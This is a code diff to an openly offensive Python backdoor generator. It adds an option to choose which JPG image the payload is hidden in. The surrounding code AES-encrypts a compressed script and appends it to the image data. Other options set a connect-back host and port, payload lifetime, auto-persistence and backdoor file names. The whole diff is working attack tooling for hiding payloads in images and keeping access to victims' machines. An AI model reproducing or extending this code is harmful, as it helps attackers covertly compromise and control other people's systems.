@@ -46,6 +46,7 @@ parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connec
 parser.add_argument("-p", "--port", type=str, help="Port to connect back to.")
 parser.add_argument("-e", "--expire", type=str, help="Payload Life: h=hour, d=day, w=week, m=month")
 parser.add_argument("-u", "--customurl", type=str, help="Host the generated jpg at this url.")
+parser.add_argument("-f", "--customimage", type=str, help="Backdoor this jpg instead of a random choice from stubs/images.")
 parser.add_argument('-a', "--persistence", action="store_true", help='Enable Auto-persistence.')
 parser.add_argument('-b', "--backdoorname", type=str, help='Name of backdoor (default backdoor.py).')
 parser.add_argument('-s', "--servername", type=str, help='Name of server (default server.py).')
@@ -146,12 +147,19 @@ random.shuffle(mywindows)
 cipher = AES.new(key)
 downpayload = EncodeAES(cipher, readyscript.encode('bz2'))
 
-image = random.choice(os.listdir("stubs/images"))
-with open('stubs/images/' + image, 'rb') as di:
+if not args.customimage:
+	image = random.choice(os.listdir("stubs/images"))
+	imgfile = 'stubs/images/' + image
+else:
+	imgfile = args.customimage
+	image = imgfile.split(os.sep)[-1]
+
+with open(imgfile, 'rb') as di:
 	imagedata = di.read()
+
 imagelen = str(len(imagedata))
 
-print ' [>] Backdooring random image %s..' % image
+print ' [>] Backdooring %s..' % image
 downpayload = imagedata + downpayload
 
 if not args.customurl:
